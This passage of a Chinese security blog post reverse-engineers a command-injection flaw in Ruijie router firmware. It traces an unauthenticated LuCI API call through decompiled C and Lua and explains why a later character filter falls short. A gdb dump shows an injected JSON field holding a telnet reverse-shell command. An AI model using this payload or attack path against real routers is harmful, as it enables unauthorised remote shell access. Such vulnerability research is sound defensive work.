class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devCap.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v17 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">7</span>;</span><br><span class="line">......</span><br><span class="line">LABEL_22:<span class="comment">//接下来使用了大量的json_object_object_add函数，该函数的作用是在已有的JSON对象中添加一个键值对，以json_object_object_add(v20, &quot;remoteIp&quot;, v23)函数为例，作用是将&#123;&quot;remote&quot;,v23&#125;这个键值对添加到v20所指的JSON对象中，</span></span><br><span class="line">      json_object_object_add(v5, <span class="string">&quot;method&quot;</span>, v19);</span><br><span class="line">      v20 = json_object_new_object();</span><br><span class="line">......</span><br><span class="line">      v21 = json_object_new_string(a1[<span class="number">2</span>]);</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;module&quot;</span>, v21);</span><br><span class="line">      v22 = a1[<span class="number">5</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;remoteIp&quot;</span>, v23);</span><br><span class="line">LABEL_35:</span><br><span class="line">      v25 = a1[<span class="number">6</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v25 )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = json_object_new_string(v25);</span><br><span class="line">......</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;remotePwd&quot;</span>, v26);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">9</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">......</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;buf&quot;</span>, v27);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *a1 != <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = *((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">42</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v30 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v30 )</span><br><span class="line">          &#123;</span><br><span class="line">            v31 = v20;</span><br><span class="line">            v32 = <span class="string">&quot;execute&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">43</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v29 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v29 )</span><br><span class="line">            json_object_object_add(v20, <span class="string">&quot;force&quot;</span>, v29);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">44</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v30 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v30 )</span><br><span class="line">          &#123;</span><br><span class="line">            v31 = v20;</span><br><span class="line">            v32 = <span class="string">&quot;configId_not_change&quot;</span>;</span><br><span class="line">LABEL_56:</span><br><span class="line">            json_object_object_add(v31, v32, v30);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_57:</span><br><span class="line">      v28 = *((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45</span>);</span><br><span class="line">LABEL_58:</span><br><span class="line">      <span class="keyword">if</span> ( v28 )</span><br><span class="line">      &#123;</span><br><span class="line">        v33 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;from_url&quot;</span>, v33);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">47</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v34 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v34 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;from_file&quot;</span>, v34);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">48</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v35 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v35 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;multi&quot;</span>, v35);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">46</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v36 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v36 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;not_commit&quot;</span>, v36);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">40</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v37 = json_object_new_boolean(*((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">41</span>) ^ <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v37 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;async&quot;</span>, v37);</span><br><span class="line">      &#125;</span><br><span class="line">      v38 = (_BYTE *)a1[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v38 || !*v38 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_78;</span><br><span class="line">      v39 = json_object_new_string(v38);</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;data&quot;</span>, v39);</span><br><span class="line">LABEL_78:</span><br><span class="line">      v41 = (_BYTE *)a1[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v41 &amp;&amp; *v41 )</span><br><span class="line">      &#123;</span><br><span class="line">        v42 = json_object_new_string(v41);</span><br><span class="line">        <span class="keyword">if</span> ( !v42 )</span><br><span class="line">        &#123;</span><br><span class="line">          json_object_put(v20);</span><br><span class="line">          json_object_put(v5);</span><br><span class="line">          v40 = <span class="number">630</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;device&quot;</span>, v42);</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v5, <span class="string">&quot;params&quot;</span>, v20);<span class="comment">//将上面的v20当做了params的值，向v5中添加新的键值对</span></span><br><span class="line">      v43 = json_object_to_json_string(v5);<span class="comment">//json_object_to_json_string作用是将JSON对象转换为JSON格式的字符串</span></span><br><span class="line">......</span><br><span class="line">      v44 = uf_socket_client_init(<span class="number">0</span>);</span><br><span class="line">......</span><br><span class="line">      v50 = <span class="built_in">strlen</span>(v43);</span><br><span class="line">      uf_socket_msg_write(v44, v43, v50);<span class="comment">//最终调用uf_socket_msg_write，用socket实现了进程间通信，将解析好的json数据发送给其他进程进行处理</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>既然存在 <code>uf_socket_msg_write</code> 进行数据发送，那么肯定就在一个地方有用 <code>uf_socket_msg_read</code> 函数进行数据的接收，用 <code>grep</code> 进行字符串搜索，发现 <code>/usr/sbin/unifyframe-sgi.elf</code> 文件，并且该文件还位于 <code>/etc/init.d</code> 目录下，这意味着该进程最初就会启动并一直存在，所以判断出这个 <code>unifyframe-sgi.elf</code> 文件就是用来接收 <code>libunifyframe.so</code> 文件所发送过来的数据</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651516.png" alt="image-20230822145039327"></p>
<h4 id="219版本之前的调用链"><a href="#219版本之前的调用链" class="headerlink" title="219版本之前的调用链"></a>219版本之前的调用链</h4><p>该调用链是 <strong>winmt</strong> 师傅在 <a href="https://www.cve.org/CVERecord?id=CVE-2023-34644">CVE-2023-34644 </a> 利用的，在 <code>219</code> 之前该调用链可以通杀大部分锐捷的路由器。下面介绍这条调用链所出示的代码均来自 <code>EW1200GI</code> 型号 软件版本为 <code>EW_3.0(1)B11P204</code> 的固件</p>
<p>在 <code>/usr/lib/lua/luci/controller/eweb/api.lua</code> 文件中，配置了路由 <code>entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code></p>
<p>这意味着当用户访问 <code>/api/auth</code> 路径时，将调用 <code>rpc_auth</code> 。在 <code>luci</code> 框架中 <code>sysauth</code> 属性控制是否需要进行系统级的用户认证才能访问该路由，这里的 <code>sysauth</code> 属性为 <code>false</code> ，表示无需进行系统认证即可访问。</p>
<p><code>rpc_auth</code> 函数首先引入了一些模块，然后获取 <code>HTTP_CONTENT_LENGTH</code> 的长度是否大于 <code>1000</code> 字节，如果不大于的话会将准备 <code>HTTP</code> 响应的类型设置为 <code>application/json</code> ，下面的 <code>handle</code> 函数第一个参数 <code>_tbl</code> 传入的是 <code>luci.modules.noauth</code> 文件返回的内容</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>到了 <code>handle</code> 函数内部后的流程与分析最新版的步骤一样，就不再赘述，最后的结果就是能在这里触发<code>noauth</code> 文件中的 <code>merge</code> 函数（前提是报文中要设置 <code>method</code> 字段的值为 <code>merge</code>）</p>
<p><code>noauth</code> 的文件中定义了 <code>merge</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>merge</code> 函数又调用了 <code>/usr/lib/lua/luci/modules/cmd.lua</code> 文件中的 <code>devSta.set</code> 函数，之后的过程又和上文中分析最新版的步骤一样，也不再重复记录</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    params.method = opt[i]</span><br><span class="line">    params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">    <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br></pre></td></tr></table></figure>



<h4 id="为什么最新版不能再走这条链了？"><a href="#为什么最新版不能再走这条链了？" class="headerlink" title="为什么最新版不能再走这条链了？"></a>为什么最新版不能再走这条链了？</h4><p>在 <code>219</code> 版本，在 <code>noauth.lua</code> 文件中的 <code>merge</code> 函数，加入了对 <code>params</code> 中危险字符的过滤，调用了 <code>includeXxs</code> 和 <code>includeQuote</code> 函数，对换行符、回车符、反引号、<code>&amp;</code>、<code>$</code>、<code>;</code>、<code>|</code> 等符号都做了过滤，这就意味着后续无法再进行命令注入了。而 <code>219</code> 版本只在这里进行了危险字符的过滤，只要从其他地方调用到诸如 <code>dev_cap</code> <code>dev_sta</code> 表中的函数依然可以进行命令注入</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> _strParams = luci.json.encode(params)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tool.includeXxs(_strParams) <span class="keyword">or</span> tool.includeQuote(_strParams) <span class="keyword">then</span></span><br><span class="line">        tool.eweblog(_strParams, <span class="string">&quot;MERGE FAILED INVALID DATA&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;INVALID DATA&#x27;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;</span><br><span class="line">        device = <span class="string">&quot;pc&quot;</span>,</span><br><span class="line">        <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>,</span><br><span class="line">        data = params,</span><br><span class="line">        async = <span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeXxs</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="keyword">local</span> ngstr = <span class="string">&quot;[\n\r`&amp;$;|]&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, ngstr) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeQuote</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, <span class="string">&quot;([&#x27;])&quot;</span>) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h3 id="漏洞文件分析"><a href="#漏洞文件分析" class="headerlink" title="漏洞文件分析"></a>漏洞文件分析</h3><p>下面开始分析 <code>/usr/sbin/unifyframe-sgi.elf</code> 文件，整体流程是在 <code>main</code> 函数调用了三个关键函数 <code>uf_socket_msg_read</code> <code>parse_content</code> <code>add_pkg_cmd2_task</code> ，他们的作用分别为 <strong>接收数据 解析数据 执行命令</strong></p>
<h4 id="字段解析"><a href="#字段解析" class="headerlink" title="字段解析"></a>字段解析</h4><p>由 <code>uf_socket_msg_read</code> 函数将 <code>json</code> 数据读入到内存中，地址为 <code>v31+1</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//uf_socket_msg_read</span></span><br><span class="line"></span><br><span class="line">  v31 = (_DWORD *)malloc_pkg();</span><br><span class="line">......</span><br><span class="line">  pthread_mutex_lock(v29 + <span class="number">5</span>);</span><br><span class="line">  *v31 = v29;</span><br><span class="line">  v52 = uf_socket_msg_read(*v29, v31 + <span class="number">1</span>);</span><br><span class="line">  pthread_mutex_unlock(v29 + <span class="number">5</span>);</span><br></pre></td></tr></table></figure>

<p>通过 <code>gdb</code> 来查看读入的数据  <strong>这里只为说明 <code>gdb</code> 可以查看内存中读入的数据，文章前后发送的报文并不一样</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/4s 0x623850</span><br><span class="line">0x623850:	&quot;&#123; \&quot;method\&quot;: \&quot;devConfig.get\&quot;, \&quot;params\&quot;: &#123; \&quot;module\&quot;: \&quot;123\&quot;, \&quot;remoteIp\&quot;: \&quot;$(mkfifo \\/tmp\\/test;telnet 192.168.45.203 6666 0&lt;\\/tmp\\/test|\\/bin\\/sh &gt; \\/tmp\\/test)\&quot;, \&quot;remotePwd\&quot;: \&quot;\&quot;, \&quot;async\&quot;: true, \&quot;data\&quot;: &quot;...</span><br><span class="line">0x623918:	&quot;\&quot;&#123;\\\&quot;kkk\\\&quot;:\\\&quot;abc\\\&quot;&#125;\&quot; &#125; &#125;&quot;</span><br></pre></td></tr></table></figure>



<p><code>json</code> 数据的各字段进行解析在 <code>parse_content</code> 函数中完成，该函数首先判断了 <code>params</code> 和 <code>method</code> 字段是否存在，然后在 <code>method</code> 字段不为 <code>cmdArr</code> 的情况下，调用 <code>parse_obj2_cmd</code> 函数进一步对字段进行解析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//parse_content </span></span><br><span class="line">  v3 = json_tokener_parse();</span><br><span class="line">  v4 = v3;</span><br><span class="line">......</span><br><span class="line">  v6 = json_object_object_get_ex(v3, <span class="string">&quot;params&quot;</span>, &amp;v18);</span><br><span class="line">  v7 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">1</span> )<span class="comment">//检查了 params 字段是否存在值</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_27:</span><br><span class="line">    json_object_put(v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v4, <span class="string">&quot;method&quot;</span>, v19) != <span class="number">1</span> )<span class="comment">//检查了 method 字段是否存在值</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_26:</span><br><span class="line">    v7 = v4;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = json_object_get_string(v19[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v8, <span class="string">&quot;cmdArr&quot;</span>) )<span class="comment">//因为发送的 method 字段不为 cmdArr，所以进入 else</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">    v16 = parse_obj2_cmd(v4); <span class="comment">//进行数据解析的具体位置,v4为Json对象                  </span></span><br><span class="line">    *v15 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( !v16 )</span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    pkg_add_cmd(a1, v15);</span><br><span class="line">    v15[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<p><code>parse_obj2_cmd</code> 函数中具体的解析了各个字段及类型并把它们记录到一个堆块中，最终返回该堆块地址，便于之后的访问。<strong>想知道 <code>POC</code> 的编写格式就要对此处进行逆向分析</strong>，具体分析结果已写在注释中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//parse_obj2_cmd</span></span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x34</span>);<span class="comment">//创建了一个堆块，用于记录和存储接下来的各种信息，该函数最终会返回这个堆块地址</span></span><br><span class="line">  v3 = v2;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(a1, <span class="string">&quot;params&quot;</span>, &amp;v38) != <span class="number">1</span> )<span class="comment">//判断params字段是否存在，存在的话将值赋给v38</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(a1, <span class="string">&quot;method&quot;</span>, &amp;v37) != <span class="number">1</span> )<span class="comment">//判断method字段是否存在，存在的话将值赋给v37</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = json_object_get_string(v37);<span class="comment">//获取到method的值，下面去匹配对应的操作，各种操作都对应一个数字，该数字放在了堆块的第一个指针处</span></span><br><span class="line">  v5 = v4;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v4, <span class="string">&quot;devSta&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v5, <span class="string">&quot;acConfig&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)v3 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v5, <span class="string">&quot;devConfig&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)v3 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v5, <span class="string">&quot;devCap&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v5, <span class="string">&quot;ufSys&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_log_printf(uf_log, (<span class="type">const</span> <span class="type">char</span> *)dword_4219EC, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">274</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)v3 = v6;</span><br><span class="line">LABEL_21:</span><br><span class="line">  v7 = <span class="built_in">strchr</span>(v5, <span class="number">46</span>);<span class="comment">//此处的strchr与strdup函数配合将method字段中xxx.xxx的字符串进行了分割，假设最初method为devConfig.get，那么此处会将get放入堆块中的第二个指针处</span></span><br><span class="line">  v8 = strdup(v7 + <span class="number">1</span>);</span><br><span class="line">  *(_DWORD *)(v3 + <span class="number">4</span>) = v8;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;module&quot;</span>, &amp;v37) != <span class="number">1</span> )<span class="comment">//判断params字段中是否存在module这个值，存在的话将module的值放入v37中，不存在直接返回</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = json_object_get_string(v37);</span><br><span class="line">  <span class="keyword">if</span> ( !v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_client_log, <span class="string">&quot;(%s %s %d)obj_module is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">294</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = strdup(v10);</span><br><span class="line">  *(_DWORD *)(v3 + <span class="number">8</span>) = v11;<span class="comment">//将module字段的值放到堆块的第三个指针中</span></span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;remoteIp&quot;</span>, &amp;v37) == <span class="number">1</span> &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(v37) - <span class="number">5</span>) &lt; <span class="number">2</span> )<span class="comment">//这里判断params字段中remoteIp是否存在，存在的话将remoteIp的值赋给v37，同时对remoteIp值的类型做了检查，这里其实就要它的类型为string</span></span><br><span class="line">  &#123;</span><br><span class="line">    v12 = json_object_get_string(v37);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = strdup(v12);</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">20</span>) = v13;<span class="comment">//将remoteIp的值放入堆块的第六个指针中</span></span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;remotePwd&quot;</span>, &amp;v37) == <span class="number">1</span> &amp;&amp; json_object_get_type(v37) == <span class="number">5</span> )<span class="comment">//作用同上类似，这里要求remotePwd的类型为array，但是如果传入array类型的话，前端做了相应的检查导致异常，因此猜测这里应该是写的Bug</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = json_object_get_string(v37);</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = strdup(v14);</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">24</span>) = v15;</span><br><span class="line">......  </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = *(_DWORD *)v3 != <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">41</span>) = v16;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;async&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v18 = v17;</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v17 == <span class="number">48</span> || !<span class="built_in">strcmp</span>(v17, <span class="string">&quot;false&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">41</span>) = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *v18 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v18, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_WORD *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v18);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;force&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v20 = v19;</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v19 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">43</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v20);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;configId_not_change&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v22 = v21;</span><br><span class="line">    <span class="keyword">if</span> ( v21 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v21 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v21, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">44</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v22);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span 